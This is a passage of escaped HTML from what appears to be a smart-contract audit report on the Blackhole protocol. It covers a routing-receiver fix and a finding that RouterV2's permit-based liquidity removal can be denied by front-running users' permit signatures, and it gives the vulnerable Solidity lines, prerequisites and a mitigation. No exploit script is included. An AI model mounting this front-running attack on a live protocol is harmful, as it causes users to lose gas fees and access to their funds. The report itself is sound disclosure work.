\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_receiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint160\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esqrtPriceAfter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroute\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eroute\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e({\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisBasic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ? \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eisStable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() : \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efalse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econcentrated:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e !\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisBasic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_receiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esqrtPriceAfter:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esqrtPriceAfter\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        });\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eHowever, this only applies to routes created through the API layer, not direct router calls by users.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-10\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-10\" aria-label=\"recommended mitigation steps 10 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eThe fix is to properly set receiver addresses for multi-hop routing.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-24\"\u003elonelybones\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-37\"\u003erayss\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-61\"\u003emaxvzuvex\u003c/a\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-10-erc-2612-permit-front-running-in-routerv2-enables-dos-of-liquidity-operations\" style=\"position:relative;\"\u003e\u003ca href=\"#m-10-erc-2612-permit-front-running-in-routerv2-enables-dos-of-liquidity-operations\" aria-label=\"m 10 erc 2612 permit front running in routerv2 enables dos of liquidity operations permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-173\"\u003e[M-10] ERC-2612 permit front-running in RouterV2 enables DoS of liquidity operations\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-410\"\u003ePolarizedLight\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eThe \u003ccode\u003eremoveLiquidityWithPermit()\u003c/code\u003e and \u003ccode\u003eremoveLiquidityETHWithPermit()\u003c/code\u003e functions in RouterV2 are vulnerable to front-running attacks that consume user permit signatures, causing legitimate liquidity removal transactions to revert and resulting in gas fee losses and a DOS.\u003c/p\u003e\n\u003ch3 id=\"finding-description-7\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-7\" aria-label=\"finding description 7 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe RouterV2 contract implements ERC-2612 permit functionality without protection against front-running attacks. The vulnerability stems from the deterministic nature of permit signatures and the lack of error handling when permit calls fail.\u003c/p\u003e\n\u003cp\u003eThis vulnerability follows a well-documented attack pattern that has been extensively researched. According to Trust Security’s comprehensive disclosure in January 2024: \u003ca href=\"https://www.trust-security.xyz/post/permission-denied\"\u003ehttps://www.trust-security.xyz/post/permission-denied\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e“Consider, though, a situation where permit() is part of a contract call:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"47\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeposit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_signature\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// This will revert if permit() was front-run\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epermit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeadline\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ev\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003er\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003es\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// User loses this functionality when permit fails\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estakingContract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeposit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis function deposits in a staking contract on behalf of the user. But what if an attacker extracts the _signature parameters from the \u003ccode\u003edeposit()\u003c/code\u003e call and frontruns it with a direct \u003ccode\u003epermit()\u003c/code\u003e? In this case, the end result is harmful, since the user loses the functionality that follows the \u003ccode\u003epermit()\u003c/code\u003e.”\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eIn RouterV2’s \u003ccode\u003eremoveLiquidityWithPermit()\u003c/code\u003e follows this exact vulnerable pattern:\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/RouterV2.sol#L475-L475\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/RouterV2.sol#L475-L475\u003c/a\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"48\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003eIBaseV1Pair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epermit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeadline\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ev\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003er\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003es\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// User loses liquidity removal functionality when permit fails\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eremoveLiquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountAMin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountBMin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeadline\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAs Trust Security formally identified: \u003cstrong\u003e“In fact, any function call that unconditionally performs \u003ccode\u003epermit()\u003c/code\u003e can be forced to revert this way.”\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eThe root cause of the issue within the blackhole protocol is that RouterV2 makes unprotected external calls to LP token permit functions without any fallback mechanism or error handling:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"49\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// Line 475 - No error handling\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003eIBaseV1Pair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epermit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeadline\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ev\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003er\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003es\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis creates a systematic vulnerability where any permit-based transaction can be griefed by extracting and front-running the permit signature.\u003c/p\u003e\n\u003ch3 id=\"code-location\" style=\"position:relative;\"\u003e\u003ca href=\"#code-location\" aria-label=\"code location permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eCode Location\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eRouterV2.sol#L475\u003c/code\u003e - \u003ccode\u003eremoveLiquidityWithPermit()\u003c/code\u003e function\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eRouterV2.sol#L493\u003c/code\u003e - \u003ccode\u003eremoveLiquidityETHWithPermit()\u003c/code\u003e function\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/RouterV2.sol#L475-L475\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/RouterV2.sol#L475-L475\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/RouterV2.sol#L493\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/RouterV2.sol#L493\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"impact-7\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-7\" aria-label=\"impact 7 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eThis vulnerability enables attackers to systematically deny service to users attempting to remove liquidity through permit-based functions, resulting in direct financial losses and protocol dysfunction.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eUsers lose transaction fees (typically \u003ccode\u003e$5-50\u003c/code\u003e per transaction depending on network congestion) when their transactions revert.\u003c/li\u003e\n\u003cli\u003eUsers must pay additional gas for traditional approve+remove patterns.\u003c/li\u003e\n\u003cli\u003eLiquidity removal becomes unreliable, forcing users to abandon efficient permit-based operations.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eAttack Prerequisites:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eMinimal: Attacker needs only basic mempool monitoring capability and gas fees.\u003c/li\u003e\n\u003cli\u003eNo special permissions or large capital requirements.\u003c/li\u003e\n\u003cli\u003eAttack can be automated and executed repeatedly.\u003c/li\u003e\n\u003cli\u003eWorks against any user attempting permit-based operations.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-11\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-11\" aria-label=\"recommended mitigation steps 11 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eImplement a different method of permit handling by wrapping the permit call in a try-catch block and only reverting if both the permit fails and the current allowance is insufficient for the operation.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"50\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eremoveLiquidityWithPermit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan 